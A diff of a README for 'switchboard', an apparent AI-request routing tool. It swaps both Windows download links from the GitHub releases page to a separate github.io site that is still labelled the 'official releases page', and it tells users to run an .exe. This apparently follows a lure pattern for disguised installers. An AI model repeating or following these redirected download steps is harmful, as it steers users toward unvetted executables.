@@ -1,6 +1,6 @@
 # 🌐 switchboard - Route your smart AI requests easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/Renatenurturant522/switchboard/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://renatenurturant522.github.io)
 
 Switchboard acts as a bridge for your computer. It connects your favorite AI tools to various intelligence providers without the need for complex programming. If one provider fails or becomes slow, the system automatically switches to another. Every choice the system makes remains visible so you understand how your requests travel.
 
@@ -27,7 +27,7 @@ Before you install the application, ensure your computer meets these basic needs
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official releases page](https://github.com/Renatenurturant522/switchboard/releases) to access the installer.
+1. Visit the [official releases page](https://renatenurturant522.github.io) to access the installer.
 2. Find the file ending in `.exe` labeled for Windows.
 3. Click the filename to save the file to your computer.
 4. Open your Downloads folder.
